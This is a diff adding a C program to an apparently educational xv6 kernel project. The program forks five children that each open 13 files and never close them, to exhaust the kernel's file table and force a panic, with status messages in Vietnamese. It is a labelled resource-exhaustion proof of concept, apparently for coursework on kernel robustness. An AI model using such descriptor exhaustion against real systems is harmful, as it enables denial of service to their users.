diff --git a/user/exploit.c b/user/exploit.c
new file mode 100644
index 0000000..1e6a926
--- /dev/null
+++ b/user/exploit.c
@@ -0,0 +1,55 @@
+#include "kernel/types.h"
+#include "kernel/stat.h"
+#include "kernel/fcntl.h"
+#include "user/user.h"
+
+#define NCHILD          5
+#define FILES_PER_CHILD 13
+
+int
+main(void)
+{
+  int i, pid;
+
+  printf("exploit: bat dau tao %d tien trinh, moi tien trinhf mo %d file...\n", NCHILD, FILES_PER_CHILD);
+  for (int i = 0; i < NCHILD; i++) {
+    pid = fork();
+
+    if (pid < 0) {
+      printf("exploit: fork that bai o vong %d\n", i);
+      exit(1);
+    }
+
+    if (pid == 0) {
+      char name[8];
+      for (int j = 0; j < FILES_PER_CHILD; j++) {
+        name[0] = 'f';
+        name[1] = '0' + i;
+        name[2] = '0' + (j / 10);
+        name[3] = '0' + (j % 10);
+        name[4] = '\0';
+
+        int fd = open(name, O_CREATE | O_RDWR);
+
+        if (fd < 0) {
+          // neu he thong da panic truoc khi toi day, dong nay se ko bao gio duoc in ra.
+          printf("exploit: con %d - open(%s) that bai o j=%d\n", i, name, j);
+          exit(1);
+        }
+      }
+
+      printf("exploit: con %d da mo xong %d file, giu nguyen khong dong\n", i, FILES_PER_CHILD);
+
+      while (1) {
+        pause(1000);
+      }
+    }
+  }
+
+  for (i = 0; i < NCHILD; i++) {
+    wait(0);
+  }
+
+  printf("exploit: khong gay duoc panic! co the can tang NCHILD\n");
+  exit(0);
+}
